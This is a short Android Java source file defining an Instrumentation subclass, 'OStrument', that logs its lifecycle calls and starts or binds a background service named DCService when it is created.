package com.faceb.pro;

import android.app.Application;
import android.app.Instrumentation;
import android.os.Bundle;

import com.faceb.svr.DCService;
import com.faceb.utils.Utils;
import com.faceb.log.Log;

public class OStrument extends Instrumentation {
    public void callApplicationOnCreate(Application application) {
        super.callApplicationOnCreate(application);
        Log.iv(Log.TAG, "callApplicationOnCreate");
    }

    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        Log.iv(Log.TAG, "onCreate");
        Utils.startServiceOrBindService(getTargetContext(), DCService.class);
    }
}
